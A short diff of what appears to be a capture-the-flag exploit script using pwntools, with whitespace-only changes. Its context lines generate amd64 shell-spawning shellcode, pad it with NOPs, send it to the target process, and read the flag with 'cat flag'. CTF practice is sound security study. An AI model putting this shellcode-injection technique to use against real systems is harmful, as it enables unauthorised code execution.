@@ -32,7 +32,7 @@ while not exit:
 	# The binary is using the clock time in ns as seed for srand
 	# clock_gettime(1,(timespec *)local_28);
   	# srand(local_28._8_4_);
-	
+
     # Use time.time_ns() to get the current time in ns and get the bytes from 0 to 4
 	#libc.srand(time.time_ns() & 0xffffffff)
 
@@ -53,13 +53,12 @@ while not exit:
 	asm_sh = asm(pwnlib.shellcraft.amd64.linux.sh())
 
 	asm_sh = asm_sh + b'\x90' * (0x300 - len(asm_sh))
-	
+
 	#asm_sh_shuffle = shuffle(libc, asm_sh, len(asm_sh))
 
 	p.send(asm_sh)
 	p.recv()
 	time.sleep(0.1)
-	
 	try:
 		p.sendline(b'cat flag')
 		flag=p.recv()
